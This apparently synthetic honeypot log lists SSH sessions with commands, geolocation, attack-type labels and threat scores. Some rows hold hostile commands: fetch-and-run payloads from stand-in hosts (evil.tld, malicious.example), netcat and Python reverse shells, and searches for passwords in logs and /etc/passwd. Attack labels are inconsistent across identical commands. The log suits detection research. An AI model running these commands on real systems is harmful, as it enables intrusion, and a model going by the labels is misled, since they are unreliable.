session_id,src_ip,timestamp,username,command,failed_logins,commands_count,has_url,payload_hash,geo_lat,geo_lon,country,attack_type,threat_score
sess_10205,81.47.184.65,2025-10-04T11:54:07.746466Z,pi,ls -la; id; uname -a,3,3,0,,52.435077,12.914439,DE,benign,0.165
sess_10237,29.191.202.151,2025-10-04T11:59:12.746466Z,pi,grep -R 'password' /var/log || true,2,1,0,,37.55114,126.75874,KR,benign,0.08
sess_10259,207.4.242.234,2025-10-04T12:07:44.746466Z,www-data,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,0,3,1,sha256:f1cbe9806ee992b49ce4ef82fade5f0c72156f2e91c489ab3352b2c49c2796b9,-22.990071,-46.462012,BR,malware_fetch,0.59
sess_10231,26.44.143.99,2025-10-04T12:09:05.746466Z,oracle,chmod +x /tmp/h; /tmp/h &,2,2,0,,51.861215,0.459484,GB,malware_fetch,0.11
sess_10262,25.206.163.175,2025-10-04T12:09:49.746466Z,unknown,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,55.62173,37.059683,RU,reverse_shell,0.09
sess_10201,223.126.201.126,2025-10-04T12:10:26.746466Z,user,ps aux | grep sshd; ls -la; id; uname -a,1,4,0,,51.807163,0.105844,GB,benign,0.145
sess_10251,14.214.57.107,2025-10-04T12:12:28.746466Z,test,grep -R 'password' /var/log || true,0,1,0,,51.55016,-0.315157,GB,recon,0.03
sess_10233,131.183.119.250,2025-10-04T12:15:12.746466Z,admin,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:5f388e752993eb9f92d581dd8983d03720d4351af902e064479cba53105d2148,28.93076,77.746363,IN,reverse_shell,0.555
sess_10225,160.55.79.28,2025-10-04T12:16:30.746466Z,postgres,ls -la; id; uname -a; whoami; pwd; ls -la,1,6,0,,52.942979,12.913505,DE,benign,0.205
sess_10241,109.224.214.249,2025-10-04T12:17:02.746466Z,oracle,whoami; pwd; ls -la; ps aux | grep sshd,1,4,0,,51.817292,-0.457101,GB,benign,0.145
sess_10235,190.180.72.145,2025-10-04T12:23:01.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x; cat /etc/passwd | grep root; nc -lvp 4444 &,2,4,0,,51.943914,13.378587,DE,recon,0.17
sess_10230,108.218.88.91,2025-10-04T12:30:14.746466Z,test,grep -R 'password' /var/log || true; ls -la; id; uname -a,0,4,0,,37.669291,-122.358574,US,benign,0.12
sess_10271,218.206.9.59,2025-10-04T12:32:52.746466Z,unknown,python3 -c 'print(2+2)',0,1,0,,51.688048,-0.682964,GB,benign,0.03
sess_10244,152.135.144.77,2025-10-04T12:36:28.746466Z,admin,chmod +x /tmp/h; /tmp/h &,8,2,0,,48.689595,2.265327,FR,payload_exec,0.26
sess_10260,119.192.178.118,2025-10-04T12:40:25.746466Z,ubuntu,echo 'hello' > /tmp/x; cat /tmp/x; ls -la; id; uname -a,3,5,0,,37.848649,-122.306873,US,benign,0.225
sess_10217,156.85.188.41,2025-10-04T12:41:16.746466Z,unknown,chmod +x /tmp/h; /tmp/h &,7,2,0,,37.57709,126.430845,KR,payload_exec,0.235
sess_10276,210.38.51.232,2025-10-04T12:41:29.746466Z,www-data,nc -e /bin/sh 10.10.10.5 4444,6,1,0,,35.299142,139.139033,JP,reverse_shell,0.18
sess_10264,35.241.65.190,2025-10-04T12:42:14.746466Z,unknown,grep -R 'password' /var/log || true,0,1,0,,48.524594,2.797919,FR,benign,0.03
sess_10203,66.219.108.127,2025-10-04T12:44:56.746466Z,pi,echo 'hello' > /tmp/x; cat /tmp/x; cat /etc/passwd | grep root,4,3,0,,28.928605,76.664132,IN,benign,0.19
sess_10270,221.23.152.243,2025-10-04T12:51:01.746466Z,postgres,ps aux | grep sshd; python3 -c 'print(2+2)',1,2,0,,38.075039,-122.82154,US,benign,0.085
sess_10224,26.222.66.61,2025-10-04T12:51:15.746466Z,guest,python3 -c 'print(2+2)'; python3 -c 'print(2+2)',0,2,0,,48.499855,2.688124,FR,benign,0.06
sess_10266,139.61.195.136,2025-10-04T12:53:05.746466Z,oracle,curl -s http://evil.tld/payload.sh | sh,6,1,1,sha256:9e7f9e8642da987125637b600b66dace9b24e0f7ca578d52bedeb11ccce6fa87,36.160914,140.275679,JP,malware_fetch,0.68
sess_10207,109.45.52.27,2025-10-04T12:57:10.746466Z,pi,ps aux | grep sshd,2,1,0,,37.779064,126.460094,KR,benign,0.08
sess_10208,155.4.84.113,2025-10-04T13:07:30.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,5,3,0,,39.835061,116.068094,CN,malware_fetch,0.215
sess_10211,163.36.6.253,2025-10-04T13:10:13.746466Z,pi,chmod +x /tmp/h; /tmp/h &,0,2,0,,51.822671,0.417544,GB,reverse_shell,0.06
sess_10218,14.125.23.121,2025-10-04T13:11:00.746466Z,oracle,grep -R 'password' /var/log || true,5,1,0,,40.192999,116.310643,CN,benign,0.155
sess_10228,67.66.101.211,2025-10-04T13:21:00.746466Z,pi,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,39.381566,116.890395,CN,benign,0.06
sess_10227,220.89.15.244,2025-10-04T13:22:02.746466Z,postgres,ls -la; id; uname -a,0,3,0,,37.040503,127.315152,KR,benign,0.09
sess_10273,50.105.4.78,2025-10-04T13:26:32.746466Z,www-data,chmod +x /tmp/h; /tmp/h &,2,2,0,,28.516491,77.687346,IN,reverse_shell,0.11
sess_10214,206.33.158.179,2025-10-04T13:31:04.746466Z,unknown,ls -la; id; uname -a,1,3,0,,48.987199,2.123348,FR,benign,0.115
sess_10220,22.205.35.225,2025-10-04T13:38:37.746466Z,guest,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x; nc -lvp 4444 &,1,6,0,,37.539591,-122.272139,US,benign,0.205
sess_10253,95.121.25.191,2025-10-04T13:41:22.746466Z,guest,whoami; pwd; ls -la,3,3,0,,29.043782,77.430822,IN,benign,0.165
sess_10275,151.254.106.177,2025-10-04T13:42:52.746466Z,pi,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,5,3,1,sha256:bc665a0cd01342b4b1339a919236bf78eefcdebc37e7eaca43dede51779a88e2,52.512925,13.944335,DE,payload_exec,0.715
sess_10252,116.135.196.168,2025-10-04T13:44:12.746466Z,user,cat /etc/passwd | grep root,2,1,0,,55.637864,37.492251,RU,benign,0.08
sess_10257,42.15.123.96,2025-10-04T13:45:05.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x; whoami; pwd; ls -la,2,5,0,,37.793121,126.720083,KR,benign,0.2
sess_10210,210.13.154.53,2025-10-04T13:52:59.746466Z,user,whoami; pwd; ls -la; ls -la; id; uname -a,1,6,0,,37.310192,-122.419901,US,benign,0.205
sess_10248,26.198.214.248,2025-10-04T13:57:50.746466Z,www-data,echo 'hello' > /tmp/x; cat /tmp/x; cat /etc/passwd | grep root,4,3,0,,39.345874,116.492864,CN,benign,0.19
sess_10213,119.205.42.164,2025-10-04T13:58:08.746466Z,ftp,ls -la; id; uname -a; ls -la; id; uname -a,0,6,0,,28.406,77.312725,IN,benign,0.18
sess_10246,180.135.46.165,2025-10-04T14:00:11.746466Z,oracle,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",5,3,0,,35.617189,139.407781,JP,reverse_shell,0.215
sess_10258,109.25.83.219,2025-10-04T14:07:52.746466Z,unknown,python3 -c 'print(2+2)',1,1,0,,39.328263,116.743764,CN,benign,0.055
sess_10202,105.232.249.84,2025-10-04T14:10:31.746466Z,root,python3 -c 'print(2+2)',0,1,0,,55.231797,37.658609,RU,benign,0.03
sess_10265,118.169.190.67,2025-10-04T14:11:30.746466Z,guest,ps aux | grep sshd,5,1,0,,52.005459,13.872311,DE,benign,0.155
sess_10238,192.182.114.171,2025-10-04T14:12:26.746466Z,test,cat /etc/passwd | grep root; python3 -c 'print(2+2)',0,2,0,,40.49734,116.965621,CN,benign,0.06
sess_10268,51.250.45.34,2025-10-04T14:19:24.746466Z,oracle,ps aux | grep sshd; ps aux | grep sshd; nc -lvp 4444 &,2,3,0,,40.444282,116.877808,CN,benign,0.14
sess_10222,13.171.0.195,2025-10-04T14:31:06.746466Z,oracle,ls -la; id; uname -a; echo 'hello' > /tmp/x; cat /tmp/x,0,5,0,,56.352151,37.871283,RU,benign,0.15
sess_10247,79.31.77.193,2025-10-04T14:41:47.746466Z,www-data,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,3,3,0,,37.874248,126.651015,KR,reverse_shell,0.165
sess_10215,200.89.61.4,2025-10-04T14:44:55.746466Z,test,ps aux | grep sshd,3,1,0,,52.231096,13.251243,DE,benign,0.105
sess_10240,92.85.45.211,2025-10-04T14:45:12.746466Z,www-data,ps aux | grep sshd; whoami; pwd; ls -la,0,4,0,,37.304542,-123.017863,US,recon,0.12
sess_10263,192.97.175.186,2025-10-04T14:46:24.746466Z,ubuntu,grep -R 'password' /var/log || true; python3 -c 'print(2+2)',3,2,0,,29.065694,76.826363,IN,benign,0.135
sess_10236,95.103.66.88,2025-10-04T14:47:23.746466Z,test,ls -la; id; uname -a; cat /etc/passwd | grep root,0,4,0,,35.721054,139.529568,JP,recon,0.12
sess_10219,93.127.213.235,2025-10-04T14:48:18.746466Z,pi,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,-23.882678,-46.614371,BR,benign,0.06
sess_10250,221.75.132.82,2025-10-04T14:50:09.746466Z,unknown,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,37.506341,-122.469611,US,payload_exec,0.09
sess_10209,36.71.63.151,2025-10-04T14:50:57.746466Z,oracle,whoami; pwd; ls -la; cat /etc/passwd | grep root,1,4,0,,-23.430491,-46.504188,BR,recon,0.145
sess_10254,69.68.153.250,2025-10-04T14:54:42.746466Z,postgres,whoami; pwd; ls -la; ps aux | grep sshd,0,4,0,,49.245363,2.641334,FR,benign,0.12
sess_10200,85.136.48.35,2025-10-04T14:56:26.746466Z,unknown,grep -R 'password' /var/log || true,4,1,0,,37.474513,-122.165726,US,recon,0.13
sess_10249,143.75.61.244,2025-10-04T14:58:22.746466Z,postgres,curl -s http://evil.tld/payload.sh | sh,8,1,1,sha256:cbb0d1b0c94fa11d4a865baa312bf53f0f8d982367a9059bdcc74223f98cf6e5,-22.964564,-46.710828,BR,malware_fetch,0.73
sess_10221,129.188.252.198,2025-10-04T15:03:29.746466Z,ubuntu,cat /etc/passwd | grep root,1,1,0,,51.67053,0.104353,GB,recon,0.055
sess_10232,211.183.245.140,2025-10-04T15:05:00.746466Z,postgres,ps aux | grep sshd; cat /etc/passwd | grep root,4,2,0,,56.090046,37.087609,RU,benign,0.16
sess_10274,141.60.144.30,2025-10-04T15:05:54.746466Z,admin,find / -maxdepth 2 -type f | head -n 20,0,1,0,,48.748307,1.944648,FR,benign,0.03
sess_10255,205.191.28.132,2025-10-04T15:07:44.746466Z,test,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,1,3,0,,52.549143,13.487407,DE,payload_exec,0.115
sess_10239,19.93.162.236,2025-10-04T15:12:28.746466Z,user,chmod +x /tmp/h; /tmp/h &,10,2,0,,-23.256088,-46.947705,BR,malware_fetch,0.31
sess_10226,217.155.20.56,2025-10-04T15:19:52.746466Z,pi,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,6,3,0,,35.148241,139.450309,JP,malware_fetch,0.24
sess_10234,158.198.181.240,2025-10-04T15:20:46.746466Z,test,chmod +x /tmp/h; /tmp/h &,3,2,0,,49.353376,1.786048,FR,reverse_shell,0.135
sess_10223,34.22.118.230,2025-10-04T15:22:29.746466Z,ftp,ps aux | grep sshd; python3 -c 'print(2+2)',2,2,0,,28.487122,77.319275,IN,benign,0.11
sess_10229,124.65.47.232,2025-10-04T15:22:58.746466Z,unknown,grep -R 'password' /var/log || true; nc -lvp 4444 &,1,2,0,,-23.281183,-46.637948,BR,benign,0.085
sess_10204,171.235.8.32,2025-10-04T15:25:48.746466Z,test,grep -R 'password' /var/log || true,4,1,0,,49.315177,2.114439,FR,benign,0.13
sess_10191,61.230.219.100,2025-10-04T15:51:49.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,8,1,0,,51.029502,0.318575,GB,payload_exec,0.23
sess_10198,119.52.126.77,2025-10-04T15:59:25.746466Z,postgres,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,9,3,1,sha256:e38d02837edd0de3dd538a3f8409421374819ba039cd06f478bb3214d6d6ae13,39.556054,116.692536,CN,reverse_shell,0.815
sess_10179,153.208.52.7,2025-10-04T16:15:05.746466Z,pi,find / -maxdepth 2 -type f | head -n 20; ls -la; id; uname -a,2,4,0,,-23.479056,-46.042024,BR,benign,0.17
sess_10189,144.247.178.122,2025-10-04T16:17:16.746466Z,postgres,whoami; pwd; ls -la; whoami; pwd; ls -la,3,6,0,,-23.372936,-46.420733,BR,recon,0.255
sess_10187,214.220.54.3,2025-10-04T16:17:32.746466Z,guest,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,1,3,0,,37.231738,126.826943,KR,payload_exec,0.115
sess_10181,195.253.100.118,2025-10-04T16:19:49.746466Z,test,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x,0,5,0,,51.885971,0.30361,GB,benign,0.15
sess_10194,91.60.122.79,2025-10-04T16:22:33.746466Z,test,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,48.479504,2.514802,FR,recon,0.06
sess_10180,73.86.194.44,2025-10-04T16:28:31.746466Z,guest,cat /etc/passwd | grep root; cat /etc/passwd | grep root,3,2,0,,37.60825,-121.886333,US,benign,0.135
sess_10190,53.124.89.142,2025-10-04T16:34:20.746466Z,pi,cat /etc/passwd | grep root; ps aux | grep sshd,1,2,0,,37.209931,-122.282472,US,benign,0.085
sess_10186,218.43.55.197,2025-10-04T16:58:24.746466Z,www-data,python3 -c 'print(2+2)'; nc -lvp 4444 &,2,2,0,,35.569041,139.994919,JP,benign,0.11
sess_10183,136.124.166.97,2025-10-04T17:07:09.746466Z,unknown,grep -R 'password' /var/log || true,0,1,0,,28.935041,76.641299,IN,benign,0.03
sess_10195,188.88.85.126,2025-10-04T17:09:29.746466Z,test,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,51.9315,12.968842,DE,payload_exec,0.09
sess_10184,197.236.107.113,2025-10-04T17:10:10.746466Z,unknown,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",1,3,0,,48.547025,2.542596,FR,payload_exec,0.115
sess_10185,194.216.193.19,2025-10-04T17:53:14.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x; grep -R 'password' /var/log || true,0,3,0,,53.082114,13.646961,DE,benign,0.09
sess_10192,58.187.166.51,2025-10-04T17:55:33.746466Z,admin,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",6,3,0,,55.622167,37.488353,RU,payload_exec,0.24
sess_10193,40.178.180.217,2025-10-04T17:55:38.746466Z,user,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,3,3,0,,28.722102,77.415532,IN,payload_exec,0.165
sess_10188,129.77.176.7,2025-10-04T18:02:26.746466Z,admin,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,3,3,1,sha256:9016c842f688beb25c9c059877313d9732f1560b75e671b6d59e8104b92f9cba,39.71588,116.748524,CN,malware_fetch,0.665
sess_10196,219.196.253.105,2025-10-04T18:04:53.746466Z,oracle,ps aux | grep sshd; ls -la; id; uname -a; nc -lvp 4444 &,0,5,0,,35.419324,139.73683,JP,benign,0.15
sess_10197,54.234.253.141,2025-10-04T18:10:06.746466Z,admin,find / -maxdepth 2 -type f | head -n 20; find / -maxdepth 2 -type f | head -n 20,0,2,0,,37.829276,127.033624,KR,benign,0.06
sess_10182,163.69.153.83,2025-10-04T18:35:20.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,6,1,0,,55.505538,37.851249,RU,malware_fetch,0.18
sess_10199,187.179.219.43,2025-10-04T18:38:52.746466Z,test,find / -maxdepth 2 -type f | head -n 20,1,1,0,,-23.948447,-46.0585,BR,benign,0.055
sess_10007,86.222.80.117,2025-10-04T19:20:30.746466Z,unknown,grep -R 'password' /var/log || true; find / -maxdepth 2 -type f | head -n 20,2,2,0,,37.976503,126.987195,KR,recon,0.11
sess_10022,173.216.141.12,2025-10-04T19:20:35.746466Z,pi,cat /etc/passwd | grep root; ps aux | grep sshd,0,2,0,,56.289861,37.846524,RU,benign,0.06
sess_10095,117.148.58.104,2025-10-04T19:25:18.746466Z,pi,chmod +x /tmp/h; /tmp/h &,3,2,0,,52.025756,13.818381,DE,reverse_shell,0.135
sess_10026,100.156.116.58,2025-10-04T19:26:04.746466Z,www-data,nc -e /bin/sh 10.10.10.5 4444,4,1,0,,35.42445,139.861478,JP,reverse_shell,0.13
sess_10038,67.139.223.125,2025-10-04T19:27:32.746466Z,oracle,python3 -c 'print(2+2)'; find / -maxdepth 2 -type f | head -n 20,1,2,0,,40.392515,116.517671,CN,benign,0.085
sess_10166,63.189.160.106,2025-10-04T19:32:06.746466Z,user,ls -la; id; uname -a,2,3,0,,35.443731,139.32713,JP,benign,0.14
sess_10138,132.135.116.185,2025-10-04T19:33:38.746466Z,user,cat /etc/passwd | grep root; python3 -c 'print(2+2)'; nc -lvp 4444 &,0,3,0,,39.326925,116.183831,CN,benign,0.09
sess_10077,154.167.113.166,2025-10-04T19:36:52.746466Z,www-data,python3 -c 'print(2+2)'; ls -la; id; uname -a; nc -lvp 4444 &,6,5,0,,37.105845,126.65976,KR,recon,0.3
sess_10121,166.224.17.33,2025-10-04T19:37:58.746466Z,ubuntu,whoami; pwd; ls -la; grep -R 'password' /var/log || true; nc -lvp 4444 &,1,5,0,,51.352557,-0.195073,GB,benign,0.175
sess_10096,73.223.205.135,2025-10-04T19:41:05.746466Z,oracle,cat /etc/passwd | grep root; find / -maxdepth 2 -type f | head -n 20,1,2,0,,35.322184,140.023174,JP,benign,0.085
sess_10069,185.92.87.45,2025-10-04T19:41:10.746466Z,user,ps aux | grep sshd,2,1,0,,-23.599015,-46.433091,BR,benign,0.08
sess_10119,150.150.164.27,2025-10-04T19:41:28.746466Z,pi,ps aux | grep sshd; python3 -c 'print(2+2)',1,2,0,,-23.278323,-46.139371,BR,benign,0.085
sess_10040,203.215.129.214,2025-10-04T19:41:58.746466Z,postgres,chmod +x /tmp/h; /tmp/h &,6,2,0,,37.955073,-122.08192,US,malware_fetch,0.21
sess_10015,36.25.7.249,2025-10-04T19:45:05.746466Z,unknown,ps aux | grep sshd,4,1,0,,52.117565,12.807586,DE,benign,0.13
sess_10171,217.91.54.236,2025-10-04T19:45:55.746466Z,ftp,curl -s http://evil.tld/payload.sh | sh,1,1,1,sha256:be0e1c6ac060a167115df6f4f2c7693ec311686c04bb9a01399909598348f9f9,51.383676,-0.280138,GB,payload_exec,0.555
sess_10087,34.43.47.111,2025-10-04T19:45:59.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,37.113178,126.802318,KR,benign,0.06
sess_10056,53.157.147.113,2025-10-04T19:53:34.746466Z,postgres,grep -R 'password' /var/log || true; echo 'hello' > /tmp/x; cat /tmp/x,0,3,0,,35.607934,139.478486,JP,recon,0.09
sess_10074,202.212.89.52,2025-10-04T19:55:42.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x; grep -R 'password' /var/log || true,3,3,0,,48.834817,2.719986,FR,benign,0.165
sess_10105,207.248.98.58,2025-10-04T19:57:10.746466Z,test,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,3,3,1,sha256:4b54b6342794d8fb1c8327277be10fca0351276128fc2b0399b59256d7453219,51.965297,13.209117,DE,payload_exec,0.665
sess_10149,182.48.94.252,2025-10-04T19:58:00.746466Z,postgres,ls -la; id; uname -a,0,3,0,,-23.75495,-46.534347,BR,benign,0.09
sess_10113,148.8.123.184,2025-10-04T19:58:49.746466Z,guest,cat /etc/passwd | grep root; ps aux | grep sshd,6,2,0,,28.095115,77.240271,IN,recon,0.21
sess_10097,100.75.120.27,2025-10-04T19:59:36.746466Z,guest,chmod +x /tmp/h; /tmp/h &,3,2,0,,37.179075,127.305418,KR,malware_fetch,0.135
sess_10169,46.118.34.182,2025-10-04T20:00:51.746466Z,root,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,-23.029816,-46.137998,BR,reverse_shell,0.09
sess_10061,42.14.122.182,2025-10-04T20:02:51.746466Z,guest,ls -la; id; uname -a; grep -R 'password' /var/log || true,0,4,0,,51.905972,-0.129749,GB,benign,0.12
sess_10008,61.78.191.196,2025-10-04T20:03:43.746466Z,ftp,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,40.486586,116.77553,CN,recon,0.06
sess_10106,207.67.192.40,2025-10-04T20:03:55.746466Z,test,python3 -c 'print(2+2)'; nc -lvp 4444 &,2,2,0,,36.253006,139.824415,JP,benign,0.11
sess_10175,203.203.39.77,2025-10-04T20:03:58.746466Z,user,python3 -c 'print(2+2)'; echo 'hello' > /tmp/x; cat /tmp/x,3,3,0,,52.747173,12.899113,DE,benign,0.165
sess_10140,145.192.160.245,2025-10-04T20:06:54.746466Z,postgres,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)',3,3,0,,37.492135,-122.438384,US,benign,0.165
sess_10054,180.41.80.62,2025-10-04T20:07:04.746466Z,ftp,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:32159ee4e5a1a7bcedb76fed41b55a86d196b3239cfe7173305cf0ebd276cc5d,48.534371,2.600547,FR,reverse_shell,0.615
sess_10118,123.197.173.250,2025-10-04T20:10:37.746466Z,postgres,grep -R 'password' /var/log || true; echo 'hello' > /tmp/x; cat /tmp/x,0,3,0,,40.027144,116.79421,CN,benign,0.09
sess_10060,11.236.211.14,2025-10-04T20:10:50.746466Z,ftp,python3 -c 'print(2+2)'; find / -maxdepth 2 -type f | head -n 20,5,2,0,,37.700639,-122.1815,US,benign,0.185
sess_10108,139.214.82.210,2025-10-04T20:14:08.746466Z,unknown,ls -la; id; uname -a; ps aux | grep sshd,2,4,0,,39.923291,115.957013,CN,benign,0.17
sess_10116,194.234.18.76,2025-10-04T20:14:39.746466Z,root,whoami; pwd; ls -la,3,3,0,,35.65758,139.135645,JP,benign,0.165
sess_10093,67.202.28.2,2025-10-04T20:15:26.746466Z,guest,find / -maxdepth 2 -type f | head -n 20,1,1,0,,28.530686,76.764023,IN,recon,0.055
sess_10080,42.232.46.170,2025-10-04T20:17:32.746466Z,www-data,ls -la; id; uname -a,3,3,0,,37.421147,-122.023619,US,benign,0.165
sess_10159,113.224.119.139,2025-10-04T20:18:56.746466Z,unknown,cat /etc/passwd | grep root,5,1,0,,-23.459168,-46.54033,BR,benign,0.155
sess_10089,105.58.142.147,2025-10-04T20:21:22.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,-23.822576,-46.318409,BR,benign,0.06
sess_10055,190.232.36.176,2025-10-04T20:23:21.746466Z,guest,ps aux | grep sshd,4,1,0,,52.911957,12.890692,DE,benign,0.13
sess_10107,203.229.119.137,2025-10-04T20:24:55.746466Z,guest,grep -R 'password' /var/log || true; cat /etc/passwd | grep root,1,2,0,,37.889826,127.311749,KR,benign,0.085
sess_10035,174.141.248.161,2025-10-04T20:24:56.746466Z,guest,cat /etc/passwd | grep root; whoami; pwd; ls -la,0,4,0,,52.379642,12.988366,DE,recon,0.12
sess_10041,177.20.15.244,2025-10-04T20:27:08.746466Z,ubuntu,cat /etc/passwd | grep root,5,1,0,,51.465441,-0.420308,GB,recon,0.155
sess_10011,106.224.231.31,2025-10-04T20:27:18.746466Z,ubuntu,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:c7aff3d35bd4a7dac0a6cdf7bf15ddf786344a545b7089a6879dfb7f6b8b7f3c,51.756809,-0.657151,GB,payload_exec,0.615
sess_10092,119.248.226.107,2025-10-04T20:34:12.746466Z,ubuntu,whoami; pwd; ls -la,1,3,0,,55.788121,37.387403,RU,benign,0.115
sess_10102,51.186.190.235,2025-10-04T20:36:51.746466Z,oracle,python3 -c 'print(2+2)'; ls -la; id; uname -a,0,4,0,,55.825356,37.481177,RU,benign,0.12
sess_10051,136.52.6.147,2025-10-04T20:37:15.746466Z,postgres,cat /etc/passwd | grep root; ls -la; id; uname -a,3,4,0,,51.388249,-0.638901,GB,benign,0.195
sess_10123,191.228.109.157,2025-10-04T20:37:35.746466Z,unknown,cat /etc/passwd | grep root; cat /etc/passwd | grep root,2,2,0,,29.210615,77.581616,IN,benign,0.11
sess_10088,181.216.26.248,2025-10-04T20:38:09.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,39.434062,116.821848,CN,benign,0.06
sess_10112,49.216.56.199,2025-10-04T20:38:17.746466Z,ubuntu,cat /etc/passwd | grep root,0,1,0,,56.159825,37.617095,RU,benign,0.03
sess_10001,42.193.40.142,2025-10-04T20:39:40.746466Z,www-data,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)'; nc -lvp 4444 &,0,4,0,,51.00315,-0.448451,GB,benign,0.12
sess_10157,68.1.11.251,2025-10-04T20:41:05.746466Z,postgres,echo 'hello' > /tmp/x; cat /tmp/x; find / -maxdepth 2 -type f | head -n 20,0,3,0,,38.091392,127.248029,KR,benign,0.09
sess_10122,30.70.187.102,2025-10-04T20:45:27.746466Z,www-data,ls -la; id; uname -a,5,3,0,,55.297113,37.947257,RU,benign,0.215
sess_10091,51.189.159.185,2025-10-04T20:48:11.746466Z,unknown,grep -R 'password' /var/log || true,0,1,0,,51.005298,-0.196064,GB,benign,0.03
sess_10153,140.103.76.43,2025-10-04T20:49:12.746466Z,ftp,python3 -c 'print(2+2)',1,1,0,,28.080663,76.767333,IN,benign,0.055
sess_10036,65.32.212.105,2025-10-04T20:49:58.746466Z,ftp,cat /etc/passwd | grep root,1,1,0,,35.924128,140.119778,JP,benign,0.055
sess_10115,199.170.68.12,2025-10-04T20:55:49.746466Z,ftp,find / -maxdepth 2 -type f | head -n 20,1,1,0,,52.138734,12.966823,DE,benign,0.055
sess_10150,157.5.133.168,2025-10-04T20:57:47.746466Z,unknown,ps aux | grep sshd,5,1,0,,38.240262,-122.095591,US,benign,0.155
sess_10178,173.78.199.82,2025-10-04T20:58:06.746466Z,admin,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,39.463208,116.03227,CN,reverse_shell,0.03
sess_10050,36.99.151.59,2025-10-04T20:58:09.746466Z,test,whoami; pwd; ls -la,2,3,0,,37.326435,-121.977247,US,benign,0.14
sess_10078,148.69.198.117,2025-10-04T21:00:55.746466Z,www-data,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)',3,3,0,,40.042983,116.934264,CN,benign,0.165
sess_10163,34.97.26.69,2025-10-04T21:02:36.746466Z,www-data,find / -maxdepth 2 -type f | head -n 20,2,1,0,,28.684521,77.184273,IN,benign,0.08
sess_10094,147.117.181.19,2025-10-04T21:08:02.746466Z,unknown,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,5,3,1,sha256:bfe0a4cd5bf5735421b3a91d717651f1efc1980ccd908cdf2111ad175ef2a8cd,48.94468,2.603599,FR,reverse_shell,0.715
sess_10131,91.163.176.250,2025-10-04T21:08:29.746466Z,test,whoami; pwd; ls -la,0,3,0,,51.023574,-0.379546,GB,benign,0.09
